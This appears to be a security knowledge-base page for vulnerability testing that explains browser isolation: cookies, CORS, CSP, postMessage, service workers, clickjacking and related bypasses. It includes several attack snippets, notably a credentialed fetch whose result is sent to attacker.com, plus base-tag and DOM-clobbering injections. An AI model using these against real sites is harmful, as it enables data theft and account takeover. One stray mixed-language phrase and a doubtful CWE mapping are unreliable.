# Browser Security Model — Deep Dive
> Source: WHATWG HTML, W3C CSP Level 3, Chrome SameSite docs, PortSwigger research | RAG Knowledge Base | Full detail preserved
> Related: `portswigger-advanced.md`, `bug-chains.md`, `oauth-oidc-advanced.md`

---

## Overview

Advanced client-side chains require understanding how browsers enforce isolation, cookie policy, CSP, and cross-origin communication. Many "unexploitable" XSS findings become Critical when combined with browser model gaps.

---

## Same-Origin Policy (SOP)

**Origin = scheme + host + port**

| Access | Cross-origin allowed? |
|---|---|
| DOM read (iframe) | No |
| DOM write (iframe) | Yes (limited) |
| Cookies (document.cookie) | No cross-origin read |
| fetch/XHR with credentials | Only same-origin unless CORS |
| postMessage | Yes, with origin check |
| form submit | Yes |
| script src, img src | Yes (embed, no read) |

**Bypass contexts:** DNS rebinding, subdomain takeover, `document.domain` (deprecated), browser bugs.

---

## Cookies — Full Taxonomy

### Attributes

| Attribute | Effect |
|---|---|
| `HttpOnly` | No JS access via document.cookie |
| `Secure` | HTTPS only |
| `SameSite=Strict` | Never sent cross-site |
| `SameSite=Lax` | Sent on top-level GET navigations (default Chrome) |
| `SameSite=None; Secure` | Sent cross-site (requires Secure) |
| `Domain` | Scope to subdomains — `.example.com` affects all subs |
| `Path` | URL path scope |
| `Max-Age` / `Expires` | Lifetime |
| `__Host-` prefix | Secure, no Domain, Path=/ |
| `__Secure-` prefix | Must have Secure |

### SameSite Behavior (Critical for CSRF/OAuth)

**Lax (default):** Cookie sent on:
- Same-site requests
- Cross-site top-level GET (link click, redirect)

**NOT sent on:** Cross-site POST, cross-site iframe, fetch/XHR cross-site.

**Strict:** Never cross-site.

**None:** Cross-site with Secure — used for embeds, OAuth iframes.

### Cookie Attacks

**Session fixation:** Attacker sets victim's session ID before login.

**Subdomain cookie theft:** `Domain=.target.com` + subdomain takeover → read session cookie.

**Cookie tossing:** Set同名 cookie on parent domain from subdomain — overwrite secure cookie if path/domain overlap.

**Forced cookie injection:** HTTP header injection sets Set-Cookie.

---

## Cross-Origin Resource Sharing (CORS)

### Simple vs Preflight
- Simple: GET/POST with safelisted headers
- Preflight: OPTIONS for custom headers, PUT/DELETE, custom Content-Type

### Misconfiguration Patterns

**ACAO: * with credentials attempt:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
Browsers block — but misconfigs exist with reflected Origin:

**Reflected Origin (Critical):**
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```
Attacker page fetches authenticated API cross-origin.

**Null Origin:**
```
Access-Control-Allow-Origin: null
```
Sandboxed iframe, data: URL — sometimes accepted incorrectly.

**Weak regex validation:**
```
Origin: https://target.com.attacker.com
Origin: https://attackeTarget.com
```

### Testing
```javascript
fetch('https://api.target.com/user', {
  credentials: 'include'
}).then(r=>r.json()).then(d=>fetch('https://attacker.com/?x='+JSON.stringify(d)))
```

**Related:** `portswigger-advanced.md` CORS section

---

## Content Security Policy (CSP)

### Directives (Level 3)

| Directive | Controls |
|---|---|
| `default-src` | Fallback |
| `script-src` | JavaScript |
| `style-src` | CSS |
| `img-src` | Images |
| `connect-src` | fetch/XHR/WebSocket |
| `frame-src` | iframes |
| `frame-ancestors` | Who can embed this page (clickjacking) |
| `base-uri` | `<base>` tag |
| `form-action` | Form submission targets |
| `upgrade-insecure-requests` | HTTP→HTTPS |

### Bypass Techniques

**strict-dynamic:** Trusts scripts loaded by trusted script — find gadget chain from allowed CDN.

**Nonce reuse:** Same nonce across requests — inject if nonce predictable/leaked.

**unsafe-inline:** Direct XSS works.

**unsafe-eval:** eval-based gadgets.

**JSONP endpoints on allowlist:** Callback = JS execution.

**AngularJS sandbox escape** (legacy apps).

**script-src * or https:** Load attacker script from any HTTPS host.

**base-uri missing:** Inject `<base href="https://attacker.com/">` → relative script paths load from attacker.

**CSP report-uri/report-to:** Exfiltrate data via violation reports.

### Reporting
```
Content-Security-Policy-Report-Only: ...; report-uri https://attacker.com
```

---

## Trusted Types

Prevents DOM XSS sinks by requiring TrustedType object instead of string.

**Sinks protected:** innerHTML, outerHTML, eval, Function, setTimeout(string), etc.

### Bypass Paths
- Find sink NOT protected by Trusted Types
- Policy allows `createHTML` from attacker-controlled policy
- Server-side XSS (TT is client-side only)
- Legacy code paths bypassing policy

---

## Cross-Origin Opener Policy (COOP)

```
Cross-Origin-Opener-Policy: same-origin
```
Isolates browsing context — prevents cross-origin window reference (`window.opener` attacks).

### Bypass / Weak Config
```
COOP: unsafe-none (default)
COOP: same-origin-allow-popups
```
XS-Leaks via `window.opener` reference after OAuth popup flow.

---

## Cross-Origin Embedder Policy (COEP) + CORP

**COEP:** `require-corp` — requires cross-origin resources to opt-in via CORP.

**CORP:**
```
Cross-Origin-Resource-Policy: same-origin
Cross-Origin-Resource-Policy: cross-origin
```

Enables `SharedArrayBuffer` — misconfig can block resources or leak timing via side channels.

---

## postMessage Security

### Vulnerable Pattern
```javascript
window.addEventListener('message', function(e) {
  // NO origin check
  eval(e.data);
});
```

### Secure Pattern
```javascript
if (e.origin !== 'https://trusted.example.com') return;
```

### Attack
Attacker iframe embeds target, posts malicious payload. Common in OAuth popups, payment widgets, chat embeds.

### Data Exfil
If sensitive data sent via postMessage without origin check → theft.

---

## Service Workers

Persistent JS running on origin scope — survives page navigation.

### Abuse
- **Persistent XSS:** Register SW that intercepts all fetch, injects script
- **Cache poisoning:** SW caches malicious response
- **Credential harvesting:** Intercept form submissions

### Requirements
HTTPS, scope path, user visit to register.

### Testing
Check if XSS can call `navigator.serviceWorker.register('/attacker-sw.js')`.

---

## Web Storage

| Storage | Scope | HttpOnly bypass? |
|---|---|---|
| localStorage | Origin | N/A — JS readable |
| sessionStorage | Tab + origin | N/A |
| IndexedDB | Origin | N/A |
| Cookies | Configurable | HttpOnly protects |

**XSS impact:** If tokens in localStorage → XSS steals directly (no HttpOnly protection).

---

## Clickjacking

Embed target in invisible iframe, trick clicks.

### Defense
```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none'
```

### Bypass
- XFO not set on all pages (only login has it, dashboard doesn't)
- Double iframe (legacy browsers)
- **Clickjacking OAuth consent** — invisible authorize button

---

## XS-Leaks (Cross-Site Leaks)

Side-channel data extraction without full XSS:

| Technique | Leaks |
|---|---|
| frame.count timing | Login state |
| error events | Script load status |
| window.open + opener | Navigation state |
| CSS injection | Attribute values |
| Performance API | Resource timing |

Useful when XSS blocked but subtle leak exists.

---

## DOM Clobbering

HTML injects named elements that override JS variables:
```html
<form id="config"><input id="apiUrl" value="https://attacker.com"></form>
```
If JS reads `window.config.apiUrl` expecting object → gets attacker DOM node.

Chain with script gadgets for XSS.

---

## Browser-Specific Notes

### Chrome
- SameSite=Lax default since Chrome 80
- Third-party cookie phaseout (Privacy Sandbox)
- Partitioned cookies (CHIPS)

### Firefox
- stricter tracking protection
- Different SameSite edge cases in older versions

### Safari (ITP)
- Aggressive third-party cookie blocking
- CNAME cloaking detection

---

## Chain Applications

| Browser gap | Chain |
|---|---|
| SameSite Lax + GET state change | CSRF on GET logout/change-email |
| CORS misconfig | XSS not needed — direct API exfil |
| postMessage no origin | Payment/OAuth token theft |
| Service Worker + XSS | Persistent ATO |
| COOP missing + OAuth popup | opener reference attack |
| CSP bypass + XSS | Full impact despite CSP |
| localStorage token + XSS | ATO without cookie theft |

See `bug-chains.md` CHAIN-007, CHAIN-008, CHAIN-022.

---

## Testing Checklist

```
[ ] Map all Set-Cookie attributes on session token
[ ] Test cross-origin fetch with credentials to API endpoints
[ ] Check CSP headers on XSS reflection points
[ ] Test postMessage handlers for origin validation
[ ] Check X-Frame-Options / frame-ancestors on sensitive actions
[ ] Test if SW registration possible from XSS context
[ ] Check token storage: cookie HttpOnly vs localStorage
[ ] OAuth popup: COOP/COEP headers on callback page
[ ] base-uri in CSP — test base tag injection
[ ] form-action directive — test form action override
```

---

## CWE Reference

| Issue | CWE |
|---|---|
| CORS misconfiguration | CWE-942 |
| CSP bypass | CWE-1021 |
| Clickjacking | CWE-1021 |
| postMessage | CWE-345 |
| Cookie scoping | CWE-1004 |
